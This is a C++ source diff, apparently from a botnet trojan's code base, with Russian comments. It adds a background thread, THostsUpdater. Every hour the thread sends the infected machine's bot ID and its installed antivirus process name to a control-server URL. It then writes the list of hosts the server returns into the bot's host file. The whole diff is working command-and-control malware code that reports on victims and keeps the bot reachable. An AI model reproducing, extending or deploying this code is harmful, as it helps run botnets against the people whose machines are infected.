@@ -12,7 +12,21 @@
 #include "Utils.h"
 #include "Config.h"
 
+#include "Config.h"
+
+#include "Modules.h"
+
 //---------------------------------------------------------------------------
+
+
+#include "BotDebug.h"
+
+namespace HostsDebugSpace
+{
+    #include "DbgTemplates.h"
+}
+
+#define HOSTSDBG  HostsDebugSpace::DBGOutMessage<>
 
 
 //------------------------------------------------------
@@ -190,16 +204,21 @@ void Hosts::ClearList(PHostList List)
 PHost Hosts::AddHost(PHostList List, PCHAR Host)
 {
 	//  Добавить новый хост в список
-	if (List == NULL)
+	if (List == NULL || STRA::IsEmpty(Host))
 		return NULL;
 
 	PHost Rec = CreateStruct(THost);
 	List::Add(List->Items, Rec);
 
-	if (!STR::IsEmpty(Host))
-		Rec->Host = STR::New(Host);
+	Rec->Host = STR::New(Host);
 
 	return Rec;
+}
+//---------------------------------------------------------------------------
+
+PHost Hosts::AddHost(PHostList List, const string &Host)
+{
+	return Hosts::AddHost(List, Host.t_str());
 }
 //---------------------------------------------------------------------------
 
@@ -766,3 +785,124 @@ void THostChecker::DoCheckHosts()
 	FThread = NULL;
 }
 //----------------------------------------------------------------------------
+
+
+
+
+//****************************************************************************
+//                                THostsUpdater
+//****************************************************************************
+THostsUpdater::THostsUpdater()
+	: TBotThread(false)
+{
+	Interval = 60 * 60 * 1000;  // интервал 1 час
+	Start();
+}
+//-----------------------------------------------------------
+
+THostsUpdater::~THostsUpdater()
+{
+
+}
+//-----------------------------------------------------------
+
+void THostsUpdater::DoExecute()
+{
+	// Запускаем цикл загрузки хостов
+	// передаём админке информацию об установленном антивирусе
+	pSleep(4000);
+
+	HOSTSDBG("HostsUpdater", "Запускаем обновление хостов");
+
+	while (!Terminated())
+	{
+		DWORD UpdateInterval = Interval;
+		Update(UpdateInterval);
+
+		// Замораживаем поток
+		pSleep(UpdateInterval);
+    }
+		
+}
+//-----------------------------------------------------------
+
+void THostsUpdater::Update(DWORD &UpdateInterval)
+{
+	// Обновляем список хостов
+
+	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_HOSTS);
+	if (!URL)
+	{
+		UpdateInterval = 30000;
+		return;
+    }
+
+
+	#ifdef CryptHTTPH
+		TCryptHTTP HTTP;
+		HTTP.Password = GetMainPassword2();
+	#else
+		THTTP HTTP;
+	#endif
+
+	// Заполняем поля
+	TBotStrings Fields;
+
+	string AntiVir = GetAntiVirusProcessName();
+	string UID     = GenerateBotID2();
+
+	Fields.AddValue("uid", UID.t_str());
+	Fields.AddValue("av",  AntiVir.t_str());
+
+	HOSTSDBG("HostsUpdater", "Загружаем список хостов:\r\nURL: %s\r\nUID: %s\r\nAV: %s", URL, UID.t_str(), AntiVir.t_str());
+
+	// Отправляем запрос
+	HTTP.CheckOkCode = false;
+	string Buf;
+	bool Done = HTTP.Post(URL, &Fields, Buf);
+	if (!Done)
+	{
+		// Не удалось выполнить запрос к серверу
+		UpdateInterval = 30000;
+		return;
+	}
+
+	if (HTTP.Response.Code == 403 && !Buf.IsEmpty())
+		SaveHosts(Buf);
+
+	STR::Free(URL);
+}
+//-----------------------------------------------------------
+
+void THostsUpdater::SaveHosts(const string &Buf)
+{
+	// Сохраняем список хостов
+	TBotStrings H;
+	H.SetText(Buf);
+
+	PHostList List = Hosts::CreateList();
+
+	HOSTSDBG("HostsUpdater", "Загруженные хосты:");
+
+	for (int i = 0; i < H.Count(); i++)
+	{
+		string Host = H.GetItem(i);
+		HOSTSDBG("HostsUpdater", "     %s", Host.t_str());
+		Hosts::AddHost(List, Host);
+    }
+
+	PCHAR FileName = Hosts::GetFileName();
+
+	Hosts::SaveListToFile(List, FileName, true);
+
+    STR::Free(FileName);
+
+	Hosts::FreeList(List);
+}
+//-----------------------------------------------------------
+
+// Функция запускает автоматическое обновление хостов
+void StartHostsUpdater()
+{
+	new THostsUpdater();
+}
